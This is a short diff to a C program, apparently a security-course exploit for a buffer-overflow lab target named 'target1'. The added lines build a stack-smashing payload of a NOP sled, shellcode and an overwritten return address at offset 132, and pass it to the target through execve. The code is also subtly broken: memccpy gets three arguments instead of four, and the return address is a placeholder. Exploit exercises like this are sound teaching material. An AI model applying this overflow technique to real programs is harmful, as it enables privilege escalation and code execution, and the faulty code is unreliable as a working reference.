@@ -7,10 +7,9 @@
 
 #define TARGET "/home/user-root/target1"
 
-int main(void)
-{
-    char *args[3];
-    char *env[1];
+int main() {
+    char* args[3];
+    char* env[1];
 
     args[0] = TARGET;
     args[1] = "hi there";
@@ -18,8 +17,18 @@ int main(void)
 
     env[0] = NULL;
 
-    if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+    args[1] = malloc(137);
+
+    memset(args[1], 0x90, 136);
+
+    args[1][136] = '\0';
+    memccpy(args[1], shellcode, strlen(shellcode));
+
+    *(unsigned int *)(args[1] + 132) = 0x12345678;
+
+    if (0 > execve(TARGET, args, env)) {
+        fprintf(stderr, "execve failed.\n");
+    }
 
     return 0;
 }
